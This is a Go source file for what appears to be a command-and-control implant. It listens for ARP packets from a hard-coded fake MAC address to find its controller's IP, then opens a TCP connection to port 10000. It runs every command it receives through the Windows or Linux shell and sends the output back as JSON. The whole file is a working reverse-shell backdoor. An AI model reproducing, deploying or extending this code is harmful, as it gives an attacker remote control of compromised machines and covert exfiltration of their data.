package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	device       string = "\\Device\\NPF_{A40BC246-AC6C-4338-B0E0-15095BC9D434}"
	snapshot_len int32  = 1024
	promiscuous  bool   = false
	err          error
	timeout      time.Duration = 5 * time.Second
	handle       *pcap.Handle
)

func ARPRead() string {
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Set filter
	var filter string = "arp"
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Looking for ARP traffic from Parent")

	foundIP := false
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	var parentIP []uint8
	parentMAC := net.HardwareAddr{0xBB, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB}
	var parentIP2String string
	for packet := range packetSource.Packets() {
		if foundIP == true {
			break
		}
		// Do something with a packet here.
		// fmt.Println(packet)
		// packet.Layer(layers.LayerTypeTCP)
		// tcp, _ := packet.(*layers.TCP)
		// fmt.Printf("From src port %d to dst port %d\n", tcp.SrcPort, tcp.DstPort)
		if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
			eth, _ := ethLayer.(*layers.Ethernet)
			if string(eth.SrcMAC) == string(parentMAC) {
				fmt.Printf("Detected Fake MAC %s, getting Parent IP \n", eth.SrcMAC)
				// fmt.Println("FOUND PARENT MAC: ", eth.SrcMAC)
				if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
					arp, _ := arpLayer.(*layers.ARP)
					// fmt.Println(reflect.TypeOf(arp.DstProtAddress))
					// fmt.Printf("From Arp Parent ADDRESS %d", arp.DstProtAddress)
					parentIP = arp.DstProtAddress
					foundIP = true
					parentIP2String = strconv.Itoa(int((parentIP[0]))) + "." + strconv.Itoa(int((parentIP[1]))) + "." + strconv.Itoa(int((parentIP[2]))) + "." + strconv.Itoa(int((parentIP[3])))
					fmt.Println("ParentIP identified: ", parentIP)
					return parentIP2String
					break

				}
			}

		}
	}
	return parentIP2String
}

type Results struct {
	ID int
	//Command string
	Output string
}

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		// fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		// fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {
	// arguments := os.Args
	// if len(arguments) == 1 {
	// 	fmt.Println("Please provide host:port.")
	// 	return
	// }
	// CONNECT := arguments[1]
	fmt.Println("###PRINTING TO SCREENONLY FOR DEV PURPOSES###")
	parentIP := ARPRead()
	fmt.Printf("Attempting to connect to %s on port 10000 \n", parentIP)

	CONNECT := parentIP + ":10000"
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer c.Close()
	fmt.Println("===Connection successful==")
	fmt.Println("Listening for commands")

	for {
		// if c has no connect, break
		var results string
		// commandString, _ := bufio.NewReader(c).ReadString('\n')
		commandString := bufio.NewScanner(c)

		commandString.Scan()

		fmt.Println("Command Received->: " + commandString.Text())
		if strings.TrimSpace(commandString.Text()) == "STOP" {
			fmt.Println("TCP client exiting...")
			return
		}
		// fmt.Println("CMD received->: ", commandString.Text())
		checkOS := OSCheck()
		if checkOS == "windows" {
			// fmt.Println("WINDOWS")
			CommandExec, err := exec.Command("cmd", "/C", commandString.Text()).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
				// NEED TO FIX UNABLE TO EXECUTE SENDING
			}
			CommandExec2 := string(CommandExec)
			results = strings.TrimSpace(CommandExec2)
			// fmt.Println(reflect.TypeOf(CommandExec))
			// fmt.Println(reflect.TypeOf(err))

		} else if checkOS == "linux" {
			// fmt.Println("LINUX")
			//fmt.Println("XS", command)
			CommandExec, err := exec.Command(strings.TrimSpace(commandString.Text())).Output()
			if err != nil {
				fmt.Println("Error executing command", err)
				c.Write([]byte("unable to execute command"))
				continue
			}
			CommandExec2 := string(CommandExec) // need for commands on linux - remove \r\n
			results = strings.TrimSpace(CommandExec2)
		}
		// fmt.Println(results2)
		// results2 := [...]string{results, "END"}
		//writing
		// fmt.Fprintf(c, results2)

		//using the Results structure
		outputTest := &Results{
			ID:     1, // TODO: need to make this random for multiple children
			Output: results,
		}
		// jsonMS, _ := json.Marshal(outputTest)

		encoder := json.NewEncoder(c)

		encoder.Encode(outputTest)
		// decoder := json.NewDecoder(c)
		// decoder.Decode(&outputTest)
		fmt.Println("Encoded format:", outputTest)
		// results2 := jsonMS
		// fmt.Println(jsonMS)
		// c.Write([]byte(encoder))
		//fmt.Fprintf(c, results2)

	}
}
